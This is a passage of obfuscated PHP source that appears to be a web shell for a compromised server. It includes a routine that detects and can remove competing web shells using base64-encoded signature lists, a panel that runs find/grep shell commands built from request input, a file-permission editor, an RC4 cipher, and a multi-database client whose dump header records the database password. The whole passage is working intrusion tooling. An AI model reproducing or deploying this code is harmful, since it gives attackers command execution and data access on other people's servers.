@base64_decode("YWRkX2RpcigkbmFtZSl8fGJjbigkaXBiYywkcGJjKXx8YnlwY3UoJGZpbGUpfHxieXdzeW0oJGZpbGUpfHxjYWxjX2Rpcl9zaXplKCRwYXRoKXx8Y29weWYoJGZpbGUxLCRmaWxlMiwkZmlsZW5hbWUpfHxkZWxldGVEaXJlY3RvcnkoJGRpcil8fGRpcnBlKCRhZGRyZXMpfHxkaXJwbWFzcygkYWRkcmVzLCRtYXNzbmFtZSwkbWFzc3NvdXJjZSl8fGRvc3NlcnZlcigpfHxkb3dubG9hZCgkZmlsZWFkZCwkZmluYW1lKXx8bGJwKCR3Yil8fG9wZW5mKCRwYXJzZWYpfHxwcmludGRyaXZlKCl8fHF1ZXJZKCR0eXBlLCRob3N0LCR1c2VyLCRwYXNzLCRkYj0nJywkcXVlcnkpfHxzaXplZSgkc2l6ZSl8fHNxbGNsaWVuVCgp")), "Locus" => @explode("||", @base64_decode("YmJlcnIoKXx8Yzk5ZnNlYXJjaCgkZCl8fGM5OWZ0cGJydXRlY2hlY2soJGhvc3QsJHBvcnQsJHRpbWVvdXQsJGxvZ2luLCRwYXNzLCRzaCwkZnFiX29ubHl3aXRoc2gpfHxjOTlnZXRzb3VyY2UoJGZuKXx8Yzk5c2hleGl0KCl8fGM5OV9idWZmX3ByZXBhcmUoKXx8Yzk5X3Nlc3NfcHV0KCRkYXRhKXx8Y2YoJGZuYW1lLCR0ZXh0KXx8Y2YoJGZuYW1lLCR0ZXh0KXx8Y2ZiKCRmbmFtZSwkdGV4dCl8fGNoZWNrcHJveHlob3N0KCl8fGRpc3BsYXlzZWNpbmZvKCRuYW1lLCR2YWx1ZSl8fGRvc3lheWljZWsoJGxpbmssJGZpbGUpfHxFTlVNRVJBVEUoKXx8ZXJyKCRuLCR0eHQ9JycpfHxlcnIoKXx8ZXgoJGNmZSl8fGV4KCRjZmUpfHxmc19jb3B5X2RpcigkZCwkdCl8fGZzX2NvcHlfb2JqKCRkLCR0KXx8ZnNfbW92ZV9kaXIoJGQsJHQpfHxmc19tb3ZlX29iaigkZCwkdCl8fGZzX3JtZGlyKCRkKXx8ZnNfcm1vYmooJG8pfHxnZXRtaWNyb3RpbWUoKXx8bHNfcmV2ZXJzZV9hbGwoKXx8bHNfc2V0Y2hlY2tib3hhbGwoc3RhdHVzKXx8bXlzaGVsbGV4ZWMoJGNtZCl8fG15c2hlbGxleGVjKCRjbWQpfHxteXNoZWxsZXhlYygkY29tbWFuZCl8fG15c3FsX2NyZWF0ZV9kYigkZGIsJHNvY2s9IiIpfHxteXNxbF9kdW1wKCRzZXQpfHxteXNxbF9mZXRjaF9hbGwoJHF1ZXJ5LCRzb2NrKXx8bXlzcWxfcXVlcnlfZm9ybSgpfHxteXNxbF9xdWVyeV9wYXJzZSgkcXVlcnkpfHxteXNxbF9zbWFydGVycm9yKCR0eXBlLCRzb2NrKXx8b25waHBzaHV0ZG93bigpfHxwYXJzZXNvcnQoJHNvcnQpfHxwYXJzZV9wZXJtcygkbW9kZSl8fHBvc2l4X2dldGdyZ2lkKCRnaWQpfHxwb3NpeF9nZXRwd3VpZCgkdWlkKXx8cG9zaXhfa2lsbCgkZ2lkKXx8cnNnX2dsb2IoKXx8cnNnX3JlYWQoKXx8c2VsZlVSTCgpfHxzZXRfZW5jb2Rlcl9pbnB1dCh0ZXh0KXx8c3RyMm1pbmkoJGNvbnRlbnQsJGxlbil8fHN0cmlwcygmJGFyciwkaz0iIil8fHRhYnNvcnQoJGEsJGIpfHx2aWV3X3Blcm1zKCRtb2RlKXx8dmlld19wZXJtc19jb2xvcigkbyl8fHZpZXdfc2l6ZSgkc2l6ZSl8fHdoaWNoKCRwcil8fHdoaWNoKCRwcik=")), "jackal" => @explode("||", @base64_decode("YXV0aGNyYWNrZVIoKXx8YnJzaGVsTCgpfHxjYWxDKCl8fGNoZWNrc210UCgkaG9zdCwkdGltZW91dCl8fGNoZWNrc3VNKCRmaWxlKXx8Y2hlY2t0aGlzcG9yVCgkaXAsJHBvcnQsJHRpbWVvdXQsJHR5cGU9MCl8fGNoZWNrX3VyTCgkdXJsLCRtZXRob2QsJHNlYXJjaCwkdGltZW91dCl8fGNyYWNrZVIoKXx8ZGljbWFrZVIoKXx8ZG93bmxvYWRpVCgkZ2V0LCRwdXQpfHxlZGl0b1IoJGZpbGUpfHxmaWxlbWFuYWdlcigpfHxmbHVzaGVSKCl8fGZvcm1jcmFja2VSKCl8fGZ0cGNyYWNrZVIoKXx8Z2V0X3N3X25hbUUoJGhvc3QsJHRpbWVvdXQpfHxoYXNoY3JhY2tlUigpfHxoZXh2aWVXKCl8fGhsaW5LKCRzdHI9IiIpfHxpbWFwY3JhY2tlUigpfHxpbWFwbG9naU4oJGhvc3QsJHVzZXJuYW1lLCRwYXNzd29yZCl8fGxpc3RkaVIoJGN3ZCwkdGFzayl8fGxvZ291VCgpfHxtYWlsZVIoKXx8bXlzcWxjbGllblQoKXx8b3BlbmlUKCRuYW1lKXx8cG9wM2NyYWNrZVIoKXx8cG9wM2xvZ2lOKCRzZXJ2ZXIsJHVzZXIsJHBhc3MpfHxwcjB4eSgpfHxzYWZlbW9kRSgpfHxzaGVsTCgkY29tbWFuZCl8fHNob3dpbWFnRSgkaW1nKXx8c2hvd3NpekUoJHNpemUpfHxzbXRwY3JhY2tlUigpfHxzbXRwbG9naU4oJGFkZHIsJHVzZXIsJHBhc3MsJHRpbWVvdXQpfHxzbm1wY2hlY0soJGlwLCRjb20sJHRpbWVvdXQpfHxzbm1wY3JhY2tlUigpfHxzcWxjcmFja2VSKCl8fHN0cl9yZXBlYXQoJHN0ciwkYyl8fHN5c2luZk8oKXx8d2Vic2hlbEwoKXx8d2hlcmVpc3RtUCgpfHx3aG9pUygp")), "SyRiAn" => @explode("||", @base64_decode("QWJvdXQoKXx8Y2hlY2tmdW5jdGlvTigkZnVuYyl8fGNvbXNoZWxMKCRjb21tYW5kLCR3cyl8fGNwYW5lbF9jaGVjaygkaG9zdCwkdXNlciwkcGFzcywkdGltZW91dCl8fENTUygkc2hlbGxDb2xvcil8fEN1cmwoKXx8Y3VycmVudEZpbGVOYW1lKCl8fERlY3J5cHRDb25maWcoKXx8RGlzYWJsZUZ1bmN0aW9ucygpfHxFeGUoJGNvbW1hbmQpfHxmZmlzaGVsTCgkY29tbWFuZCl8fGZvb3RlcigpfHxmdHBfY2hlY2soJGhvc3QsJHVzZXIsJHBhc3MsJHRpbWVvdXQpfHxHZW5lcmF0ZUZpbGUoJG5hbWUsJGNvbnRlbnQpfHxHZXRSZWFsSVAoKXx8Z2V0X3Bhc3MoJGxpbmspfHxHemlwKCl8fEhhcmRTaXplKCRzaXplKXx8aW5wdXQoJHR5cGUsJG5hbWUsJHZhbHVlLCRzaXplKXx8TG9nb3V0KCl8fG1hZ2ljUW91dHMoKXx8TVNRTCgpfHxNc1NRTCgpfHxNeVNRTDIoKXx8TXlzcWxJKCl8fG9wZW5CYXNlRGlyKCl8fE9yYWNsZSgpfHxwZXJsc2hlbEwoJGNvbW1hbmQpfHxQb3N0Z3JlU1FMKCl8fHJlYWRfZGlyKCRwYXRoLCR1c2VybmFtZSl8fFJlZ2lzdGVyR2xvYmFscygpfHxyb290eHBMKCl8fFNhZmVNb2RlKCl8fFNlbGVjdENvbW1hbmQoJG9zKXx8c2hvd1VzZXJzKCl8fFNRbExpdGUoKXx8c3J2c2hlbEwoJGNvbW1hbmQpfHxzdHJfaGV4KCRzdHJpbmcpfHxTdWljaWRlKCl8fHR1bGlzKCRmaWxlLCR0ZXh0KXx8dXBkYXRlKCl8fHdoZXJlaXN0bVAoKXx8d2hpY2goJHByKXx8d2luc2hlbEwoJGNvbW1hbmQp")));
    $content = z9p($file);
    if (!$content) {
        return false;
    }

    $cleanct = @preg_replace('/[\s\t\r\n\v]/', '', $content);
    foreach ($knownfunc as $type => $funcs) {
        $score = 0;
        $count = @count($funcs);
        $min = @round($count * 0.75);
        foreach ($funcs as $func) {
            if (@strstr($cleanct, $func)) {
                $score++;
            }
        }
        $foundp = @round(($score / $count) * 100);
        if ($score >= $min) {
            if ($replace) {
                $replaced = " : " . (z2q($file) ? z9s("290") : z9s("291"));
            }
            return ($foundp == 100 ? $type . $replaced : $type . " (" . $foundp . "%)" . $replaced);
        }
    }
    if ($possible) {
        if ((@preg_match('/' . @base64_decode("KHN5c3RlbXxwYXNzdGhydXxzaGVsbF9leGVjfHBvcGVufHByb2Nfb3BlbikuezAsMTB9") . '/i', $content) && @preg_match('/' . @base64_decode("YmFja19jb25uZWN0fGJhY2tkb29yfHI1N3xQSFBKYWNrYWx8UGhwU3B5fEdpWHxGeDI5U2hlTEx8dzRjazFuZ3xtaWx3MHJtfFBocFNoZWxsfGsxcjR8RmVlTENvTXp8RmFUYUxpc1RpQ3p8VmVfY0VOeFNoZWxsfFVuaXhPbnxDOTltYWRTaGVsbHxTcGFtZm9yZHp8TG9jdXM3c3xjMTAwfGM5OXx4MjMwMHxjZ2l0ZWxuZXR8d2ViYWRtaW58U1RVTlNIRUxMfFByIXY4fFBIUFNoZWxsfEthTWVMZU9ufFM0VHxvUmJ8dHJ5YWd8bm9leGVjc2hlbGx8XC9ldGNcL3Bhc3N3ZHxyZXZlbmdhbnM=") . '/', $content)) || @preg_match('/' . @base64_decode("ZXZhbC57MCwxMH1iYXNlNjRfZGVjb2Rl") . '/i', $content)) {
            if ($replace) {
                $replaced = (z2q($file) ? " : " . z9s("290") : " : " . z9s("291"));
            }
            return "Possible backdoor" . $replaced;
        }
    }
    return false;
}

function z0p($i, $t, $h, $a) {
    $r = z10e(z7i(z6x('<form method="POST" action="?" onsubmit="return chkfrm(\'' . $i . '\',\'' . $t . '\');">' . '<input type="hidden" name="' . $t . '" id="' . $t . '">' . $h . z8m(z9s("63"), 'chkall(\'' . $i . '\',true);', '7') . z8m(z9s("64"), 'chkall(\'' . $i . '\',false);', '7') . z8m(z9s("65"), 'invall(\'' . $i . '\');', '7') . z4a('action', $a, '4') . z8v(z9s("77"), '7') . '</form>', '11')), '2');
    return "<script type=\"text/javascript\">document.write('" . @str_replace("'", "\\'", @str_replace("\n", "", $r)) . "');</script>";
}

function z4n($f, $i, $id = '') {
    return '<script>document.write(\'<input type="checkbox" id="' . $id . 'chk" name="' . $i . '" value="' . $f . '" onclick="changetr(this.id.replace(\\\'chk\\\',\\\'\\\'), this.checked);" style="vertical-align: middle;">\');</script>';
}

function z1c() {
    return "<script type=\"text/javascript\">function fnc_replace(idT,idA,idB){ var strT=document.getElementById(idT).value; var strA=document.getElementById(idA).value; var strB=document.getElementById(idB).value; if(strA !='' && strT.indexOf(strA)!=-1){ var repRegex=new RegExp(strA.escR(), 'g'); document.getElementById(idT).value=strT.replace(repRegex, strB);};}; String.prototype.escR=function(){ var sChars=[ '$', '^', '*', '(', ')', '+', '[', ']', '{', '}', '\\\\', '|', '.', '?', '/' ]; var regex=new RegExp('(\\\\' + sChars.join('|\\\\') + ')', 'g'); return this.replace(regex, '\\\\$1');}</script>";
}

function z3n() {
    return '<script type="text/javascript">
if(!document.getElementById){ if(document.all){ document.getElementById=function(){ if(typeof document.all[arguments[0]]!="undefined"){ return document.all[arguments[0]]; } else { return null; };};} else if(document.layers){ document.getElementById=function(){ if(typeof document[arguments[0]]!="undefined"){ return document[arguments[0]]; } else { return null; };};};}
function changecls(trid, newcls){ try { document.getElementById(trid).className = document.getElementById(trid).className.replace(/[a-zA-Z0-9]+/,newcls); } catch(err){} }
function changetr(trid, vbool){ if(vbool){ changecls(trid,"list3"); } else { if(trid.substr(0,3) == "tra"){ changecls(trid,"list1"); } else { changecls(trid,"list2");};};}
function chkfrm(inid, hid){ var inputs=document.getElementsByTagName("input");var ichk=[];for(var i=0;i<inputs.length;i++){ if(inputs[i].type=="checkbox"&&inputs[i].name==inid){ if(inputs[i].checked){ ichk.push(inputs[i].value);};};};if(ichk.length > 0){ document.getElementById(hid).value = ichk.join("\n"); return true; } else { return false;};}
function chkall(inid,vbool){ var inputs=document.getElementsByTagName("input");for(var i=0;i<inputs.length;i++){ if(inputs[i].type=="checkbox"&&inputs[i].name==inid){ inputs[i].checked = vbool; changetr(inputs[i].id.replace(\'chk\', \'\'), vbool); };};}
function invall(inid){ var inputs=document.getElementsByTagName("input");for(var i=0;i<inputs.length;i++){ if(inputs[i].type=="checkbox"&&inputs[i].name==inid){ if(inputs[i].checked == true){ inputs[i].checked = false; changetr(inputs[i].id.replace(\'chk\', \'\'), false); } else { inputs[i].checked = true; changetr(inputs[i].id.replace(\'chk\', \'\'), true); };};};}
</script>';
}

function z3w($var, $f) {
    $val = '';
    if (!empty($f)) {
        $reg = '/\$' . $var . '\s*=\s*([\'"]{1})([^\1\s\t\r\n]+)\1\s*;/';
        if (@preg_match($reg, $f, $m)) {
            $val = $m[2];
            unset($m);
        }
    }
    unset($f);
    return $val;
}

function z2a($var, $f) {
    $val = '';
    if (!empty($f)) {
        $reg = '/([\'"]{1})' . $var . '\1[\s\t\r\n]*=>[\s\t\r\n]*([\'"]{1})([^\2\s\t\r\n]+)\2/';
        if (@preg_match($reg, $f, $m)) {
            $val = $m[3];
            unset($m);
        }
    }
    unset($f);
    return $val;
}

function z2p($var, $f) {
    $val = '';
    if (!empty($f)) {
        $reg = '/\[([\'"]{1})' . $var . '\1\][\s\t\r\n]*=[\s\t\r\n]*([\'"]{1})([^\2\s\t\r\n]+)\2/';
        if (@preg_match($reg, $f, $m)) {
            $val = $m[3];
            unset($m);
        }
    }
    unset($f);
    return $val;
}

function z1v($const, $f) {
    $val = '';
    if (!empty($f)) {
        $reg = '/define\s*\(([\'"]{1})' . $const . '\1\s*,\s*([\'"]{1})([^\2\s\t\r\n]+)\2\s*\)\s*;/';
        if (@preg_match($reg, $f, $m)) {
            $val = $m[3];
            unset($m);
        }
    }
    unset($f);
    return $val;
}

function z4b($type, $var, $f) {
    switch ($type) {
    case 'var':
        return z3w($var, $f);
        break;
    case 'const':
        return z1v($var, $f);
        break;
    case 'arrayvar1':
        return z2a($var, $f);
        break;
    case 'arrayvar2':
        return z2p($var, $f);
        break;
    default:
        return '';
    }
}

function z3v($s, $t = 0) {
    $reg = '[_a-zA-Z0-9-]+(\.[_a-zA-Z0-9-]+)*@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*\.(([0-9]{1,3})|([a-zA-Z]{2,3})|(aero|coop|info|museum|name))';
    if ($t) {
        return @preg_match('/^' . $reg . '$/i', $s);
    }

    $r = array();
    if (@preg_match_all('/' . $reg . '/i', $s, $m)) {
        foreach ($m[0] as $em) {
            $r[] = $em;
        }
    }
    return @array_unique($r);
}

function z1r($a, $s = " and", $f = array()) {
    if (!@is_array($a)) {
        $a = array();
    }

    $r = "";
    foreach ($a as $k => $v) {
        $p = "";
        if (!@empty($f[$k])) {
            $p .= $f[$k] . "(";
        }

        $p .= "'" . addslashes($v) . "'";
        if (!@empty($f[$k])) {
            $p .= ")";
        }

        $r .= "`" . $k . "` = " . $p . $s;
    }
    $r = @substr($r, 0, @strlen($r)-@strlen($s));
    return $r;
}

function z1q($file, $global = 0, $dir = 0) {
    $mode = @fileperms($file);
    if ($dir) {
        $arr = ($global ? array() : array("act", "d", "ctarget" => $file, "chmod_submit" => "1"));
    } else {
        $arr = ($global ? array() : array("act", "d", "f", "ft" => "functions", "ctarget" => $file, "chmod_submit" => "1"));
    }
    if ($mode) {
        $perms = z9r($mode, 1);
        $o = @decoct($mode);
        if (@strlen($o) > 4) {
            $o = @substr($o, -4);
        }

        echo z2b(($dir ? z9s("123") : z9s("93")) . z9c() . z4p($file));
        echo z10e(z7i(z9j(z5c($arr, z10e(z5n() . z7i(z5t(z9s("94", '', 1)) . z9j(z5y("chmod_or", z9s("97"), "chmod_o[r]", "1", (($perms["o"]["r"]) ? 1 : '')) . z9c(5) . z5y("chmod_ow", z9s("98"), "chmod_o[w]", "1", (($perms["o"]["w"]) ? 1 : '')) . z9c(5) . z5y("chmod_ox", z9s("99"), "chmod_o[x]", "1", (($perms["o"]["x"]) ? 1 : ''))) . z9j(z9c())) . z7i(z5t(z9s("95", '', 1)) . z9j(z5y("chmod_gr", z9s("97"), "chmod_g[r]", "1", (($perms["g"]["r"]) ? 1 : '')) . z9c(5) . z5y("chmod_gw", z9s("98"), "chmod_g[w]", "1", (($perms["g"]["w"]) ? 1 : '')) . z9c(5) . z5y("chmod_gx", z9s("99"), "chmod_g[x]", "1", (($perms["g"]["x"]) ? 1 : ''))) . z9j(z9c(5) . z8v("Chmod", "7"))) . z7i(z5t(z9s("96", '', 1)) . z9j(z5y("chmod_wr", z9s("97"), "chmod_w[r]", "1", (($perms["w"]["r"]) ? 1 : '')) . z9c(5) . z5y("chmod_ww", z9s("98"), "chmod_w[w]", "1", (($perms["w"]["w"]) ? 1 : '')) . z9c(5) . z5y("chmod_wx", z9s("99"), "chmod_w[x]", "1", (($perms["w"]["x"]) ? 1 : ''))) . z9j(z9c())) . z5n(), "2"))) . z9j(z5c(array("act", "d", "f", "ft" => "functions", "ctarget" => $file, "chmod_submit" => "1"), z10e(z7i(z5t(z9s("101")) . z9j(z5u("chmod_val", $o, "1") . z8v(z9s("100"), "7"))), "2")))));
    }
}

function z0d() {
    global $found, $nix, $sh_exec, $sn, $sn_reg, $s_in, $st, $st_reg, $st_wwo, $st_cs, $st_not, $s_fd, $s_rec;
    echo z2b(z9s("142")) . z6d();
    $as_fd = array('1' => z9s("144"), '2' => z9s("145"), '' => z9s("146"));
    $a_rec = array('' => z9s("21"));
    for ($i = 0; $i < 10; $i++) {
        $a_rec[($i + 1)] = ($i + 1) . " " . z9s("145");
    }

    $a_rec['no'] = z9s("22");
    $a_paths = array('cwd' => 'cwd', 'system' => 'system', 'bin' => '(s)bin dirs', 'etc' => '/etc');
    echo z5c(array('d', 'act' => 'search', 'ftarget' => '1'), z10e(z9f(z9j(z10e(z7i(z5t(z9s("143")) . z9j(z6i("sn", @htmlspecialchars($sn), '2') . z4a("s_fd", $as_fd, '1', '1') . z4a("s_rec", $a_rec, '1', '1') . z6p("submit", z9s("147"), '7') . ' ' . z5y('sn_reg', z9s("148"), 'sn_reg'))) . z7i(z5t(z9s("149")) . z9j(z6i("s_in", htmlspecialchars($s_in), "9")))) . z10e(z7i(z5t(z9s("150")) . z9j(z6i("st", @htmlspecialchars($st), "9"))) . z7i(z5t("") . z9j(z5y("st_reg", z9s("151"), "st_reg") . z9c("3") . z5y("st_wwo", z9s("152"), "st_wwo") . z9c("3") . z5y("st_cs", z9s("153"), "st_cs") . z9c("3") . z5y("st_not", z9s("154"), "st_not"))))))));
    echo z6d();
    if ($nix && $sh_exec) {
        echo z2b(z9s("155")) . z6d();
        global $findaliases, $unixfind, $find_text, $find_in_dir, $find_in_files, $find_defined, $spath, $lsman;
        if (!@isset($spath)) {
            $spath = 'cwd';
        }

        $find_result = "";
        if (@isset($unixfind) && $unixfind == "1" && @isset($find_text) && !@empty($find_text) && @isset($find_in_dir) && !@empty($find_in_dir) && @isset($find_in_files) && !@empty($find_in_files)) {
            $find_infiles = @array_unique(@explode(";", $find_in_files));
            foreach ($find_infiles as $find_in_file) {
                $find_result .= z9t('find "' . $find_in_dir . '" -name "' . $find_in_file . '" -print0|xargs -0 grep -E "' . $find_text . '"', 0);
            }
        }
        echo z5c(array('d', 'act' => 'search', 'unixfind' => '1'), z10e(z7i(z5t(z9s("156")) . z9j(z6i("find_text", @htmlspecialchars($find_text), '0') . z8v(z9s("147"), '7'))) . z7i(z5t(z9s("149")) . z9j(z6i("find_in_dir", @htmlspecialchars($find_in_dir), "9"))) . z7i(z5t(z9s("157")) . z9j(z6i("find_in_files", @htmlspecialchars($find_in_files), "9")))));
        echo z5c(array('d', 'act' => 'search', 'unixfind' => '2'), z10e(z7i(z5t(z9s("158")) . z9j(z2u("find_defined", $findaliases, "0", '1') . z4a('spath', $a_paths, '1', '1') . z8v(z9s("147"), '7') . z5y("lsman", z9s("159"), 'lsman', '1')))));
        echo z6d();
        if (@isset($unixfind) && $unixfind == "2" && @isset($find_defined) && !@empty($find_defined)) {
            if ($spath == 'system') {
                $rep = '/';
            } elseif ($spath == 'etc') {
                $rep = '/etc';
            } elseif ($spath == 'bin') {
                $rep = '/bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin';
            } else {
                $rep = '"' . $find_in_dir . '"';
            }
            if (@isset($lsman) && $lsman) {
                $find_defined = @str_replace(' -ls', '', $find_defined);
            }
            $find_defined = @str_replace('%path%', $rep, $find_defined);
            $find_result = z9t($find_defined, 0);
        }
        if (!@empty($find_result)) {
            if (@isset($lsman) && $lsman) {
                global $ls_a, $act, $fullpath, $nolsmenu, $nohead;
                $tls_a = @explode("\n", $find_result);
                $ls_a = array();
                foreach ($tls_a as $ls) {
                    $ls = @trim($ls);
                    if (!@empty($ls) && !@in_array($ls, $ls_a)) {
                        $ls_a[] = $ls;
                    }
                }
                if (@count($ls_a) > 0) {
                    $act = "ls";
                    $fullpath = 1;
                    $nolsmenu = 1;
                    $nohead = 1;
                }
            } else {
                echo z10e(z9f(z6x(z5w('', '1', 1) . @htmlspecialchars($find_result) . z5q())), '2') . z6d();
            }
        }
    }
}

function z7q() {
    global $images;
    return (@is_array($images) ? $images : array());
}

class zrc4 {
    function zenc($pwd, $data, $ispwdHex = 0) {
        if ($ispwdHex) {
            $pwd = @pack('H*', $pwd);
        }

        $key[] = '';
        $box[] = '';
        $cipher = '';
        $pwd_length = @strlen($pwd);
        $data_length = @strlen($data);
        for ($i = 0; $i < 256; $i++) {
            $key[$i] = @ord($pwd[$i % $pwd_length]);
            $box[$i] = $i;
        }
        for ($j = $i = 0; $i < 256; $i++) {
            $j = ($j + $box[$i] + $key[$i]) % 256;
            $tmp = $box[$i];
            $box[$i] = $box[$j];
            $box[$j] = $tmp;
        }
        for ($a = $j = $i = 0; $i < $data_length; $i++) {
            $a = ($a + 1) % 256;
            $j = ($j + $box[$a]) % 256;
            $tmp = $box[$a];
            $box[$a] = $box[$j];
            $box[$j] = $tmp;
            $k = $box[(($box[$a] + $box[$j]) % 256)];
            $cipher .= @chr(@ord($data[$i]) ^ $k);
        }
        return $cipher;
    }

    function zdec($pwd, $data, $ispwdHex = 0) {
        return zrc4::zenc($pwd, $data, $ispwdHex);
    }
}

class my_sql {
    var $host = 'localhost';
    var $port = '';
    var $user = '';
    var $pass = '';
    var $base = '';
    var $db = '';
    var $connection;
    var $res;
    var $error;
    var $rows;
    var $columns;
    var $num_rows;
    var $num_fields;
    var $dump;

    function connect() {
        switch ($this->db) {
        case 'MySQL':
            if (empty($this->port)) {
                $this->port = '3306';
            }
            if (!@function_exists('mysql_connect')) {
                return 0;
            }

            $this->connection = @mysql_connect($this->host . ':' . $this->port, $this->user, $this->pass);
            if (is_resource($this->connection)) {
                return 1;
            }

            break;
        case 'MSSQL':
            if (empty($this->port)) {
                $this->port = '1433';
            }
            if (!@function_exists('mssql_connect')) {
                return 0;
            }

            $this->connection = @mssql_connect($this->host . ',' . $this->port, $this->user, $this->pass);
            if ($this->connection) {
                return 1;
            }

            break;
        case 'PostgreSQL':
            if (empty($this->port)) {
                $this->port = '5432';
            }
            $str = "host='" . $this->host . "' port='" . $this->port . "' user='" . $this->user . "' password='" . $this->pass . "' dbname='" . $this->base . "'";
            if (!@function_exists('pg_connect')) {
                return 0;
            }

            $this->connection = @pg_connect($str);
            if (is_resource($this->connection)) {
                return 1;
            }

            break;
        case 'Oracle':
            if (!@function_exists('ocilogon')) {
                return 0;
            }

            $this->connection = @ocilogon($this->user, $this->pass, $this->base);
            if (is_resource($this->connection)) {
                return 1;
            }

            break;
        }
        return 0;
    }

    function select_db() {
        switch ($this->db) {
        case 'MySQL':
            if (@mysql_select_db($this->base, $this->connection)) {
                return 1;
            }

            break;
        case 'MSSQL':
            if (@mssql_select_db($this->base, $this->connection)) {
                return 1;
            }

            break;
        case 'PostgreSQL':
            return 1;
            break;
        case 'Oracle':
            return 1;
            break;
        }
        return 0;
    }

    function list_dbs() {
        $tmplist = array();
        switch ($this->db) {
        case 'MySQL':
            $this->res = @mysql_list_dbs($this->connection);
            while ($tmprow = @mysql_fetch_object($this->res)) {
                $tmplist[$tmprow->Database] = $tmprow->Database;
            }

            break;
        case 'MSSQL':
            break;
        case 'PostgreSQL':
            break;
        case 'Oracle':
            break;
        }
        return $tmplist;
    }

    function query($query) {
        $this->res = $this->error = '';
        switch ($this->db) {
        case 'MySQL':
            if (false === ($this->res = @mysql_query('/*' . chr(0) . '*/' . $query, $this->connection))) {
                $this->error = @mysql_error($this->connection);
                return 0;
            } else if (is_resource($this->res)) {
                return 1;
            }
            return 2;
            break;
        case 'MSSQL':
            if (false === ($this->res = @mssql_query($query, $this->connection))) {
                $this->error = 'Query error';
                return 0;
            } else if (@mssql_num_rows($this->res) > 0) {
                return 1;
            }
            return 2;
            break;
        case 'PostgreSQL':
            if (false === ($this->res = @pg_query($this->connection, $query))) {
                $this->error = @pg_last_error($this->connection);
                return 0;
            } else if (@pg_num_rows($this->res) > 0) {
                return 1;
            }
            return 2;
            break;
        case 'Oracle':
            if (false === ($this->res = @ociparse($this->connection, $query))) {
                $this->error = 'Query parse error';
            } else {
                if (@ociexecute($this->res)) {
                    if (@ocirowcount($this->res) != 0) {
                        return 2;
                    }
                    return 1;
                }
                $error = @ocierror();
                $this->error = $error['message'];
            }
            break;
        }
        return 0;
    }

    function get_result() {
        $this->rows = array();
        $this->columns = array();
        $this->get_num_fields();
        $this->get_num_rows();
        switch ($this->db) {
        case 'MySQL':
            while (false !== ($this->rows[] = @mysql_fetch_assoc($this->res)));
            if ($this->num_fields) {
                $this->columns = @array_keys($this->rows[0]);
                if (@count($this->columns) < 1) {
                    $this->get_columns();
                }
                @mysql_free_result($this->res);
                return 1;
            }
            @mysql_free_result($this->res);
            break;
        case 'MSSQL':
            while (false !== ($this->rows[] = @mssql_fetch_assoc($this->res)));
            if ($this->num_fields) {
                $this->columns = @array_keys($this->rows[0]);
                if (@count($this->columns) < 1) {
                    $this->get_columns();
                }
                @mssql_free_result($this->res);
                return 1;
            }
            @mssql_free_result($this->res);
            break;
        case 'PostgreSQL':
            while (false !== ($this->rows[] = @pg_fetch_assoc($this->res)));
            if ($this->num_fields) {
                $this->columns = @array_keys($this->rows[0]);
                if (@count($this->columns) < 1) {
                    $this->get_columns();
                }
                @pg_free_result($this->res);
                return 1;
            }
            @pg_free_result($this->res);
            break;
        case 'Oracle':
            while (false !== ($this->rows[] = @oci_fetch_assoc($this->res)));
            if ($this->num_fields) {
                $this->columns = @array_keys($this->rows[0]);
                if (@count($this->columns) < 1) {
                    $this->get_columns();
                }
                @ocifreestatement($this->res);
                return 1;
            }
            @ocifreestatement($this->res);
            break;
        }
        return 0;
    }

    function get_num_rows() {
        $this->num_rows = 0;
        switch ($this->db) {
        case 'MySQL':
            $this->num_rows = @mysql_num_rows($this->res);
            break;
        case 'MSSQL':
            $this->num_rows = @mssql_num_rows($this->res);
            break;
        case 'PostgreSQL':
            $this->num_rows = @pg_num_rows($this->res);
            break;
        case 'Oracle':
            while (false !== (@oci_fetch_assoc($this->res))) {
                $this->num_rows++;
            }

            break;
        }
    }

    function get_columns() {
        $this->columns = array();
        $this->get_num_fields();
        switch ($this->db) {
        case 'MySQL':
            for ($i = 0; $i < $this->num_fields; $i++) {
                if (@mysql_field_name($this->res, $i) !== false) {
                    $this->columns[] = @mysql_field_name($this->res, $i);
                }
            }
            break;
        case 'MSSQL':
            for ($i = 0; $i < $this->num_fields; $i++) {
                if (@mssql_field_name($this->res, $i) !== false) {
                    $this->columns[] = @mssql_field_name($this->res, $i);
                }
            }
            break;
        case 'PostgreSQL':
            for ($i = 0; $i < $this->num_fields; $i++) {
                if (@pg_field_name($this->res, $i) !== false) {
                    $this->columns[] = @pg_field_name($this->res, $i);
                }
            }
            break;
        case 'Oracle':
            for ($i = 0; $i < $this->num_fields; $i++) {
                if (@ocicolumnname($this->res, $i) !== false) {
                    $this->columns[] = @ocicolumnname($this->res, $i);
                }
            }
            break;
        }
    }

    function get_num_fields() {
        $this->num_fields = 0;
        switch ($this->db) {
        case 'MySQL':
            $this->num_fields = @mysql_num_fields($this->res);
            break;
        case 'MSSQL':
            $this->num_fields = @mssql_num_fields($this->res);
            break;
        case 'PostgreSQL':
            $this->num_fields = @pg_num_fields($this->res);
            break;
        case 'Oracle':
            $this->num_fields = @ocinumcols($this->res);
            break;
        }
    }

    function parse_fields($table) {
        if (!$this->query('SELECT * FROM `' . $table . '` LIMIT 0,1;')) {
            return 0;
        }
        return ($this->get_result() ? $this->num_fields : 0);
    }

    function count_rows($table) {
        $tmpcount = 0;
        switch ($this->db) {
        case 'MySQL':
            $this->query('SELECT COUNT(*) FROM `' . $table . '`;');
            if (@is_resource($this->res)) {
                $tmp = @mysql_fetch_array($this->res);
                $tmpcount = $tmp[0];
            }
            break;
        case 'MSSQL':
            break;
        case 'PostgreSQL':
            break;
        case 'Oracle':
            break;
        }
        return (@is_numeric($tmpcount) ? $tmpcount : 0);
    }

    function dump($table) {
        if (empty($table)) {
            return 0;
        }

        $this->dump = array();
        $this->dump[0] = '--';
        $this->dump[1] = '-- ----------------------------------------------- ';
        $this->dump[2] = '-- Dump date : ' . @date("d/m/Y H:i:s");
        $this->dump[3] = '-- PHP shell : ' . z8o();
        $this->dump[4] = '-- ----------------------------------------------- ';
        $this->dump[5] = '-- SQL host  : ' . $this->host . ':' . $this->port;
        $this->dump[6] = '-- SQL user  : ' . $this->user;
        $this->dump[7] = '-- SQL pass  : ' . $this->pass;
        $this->dump[8] = '-- SQL db    : ' . $this->base;
        $this->dump[9] = '-- SQL table : ' . $table;
        $this->dump[10] = '-- ----------------------------------------------- ';
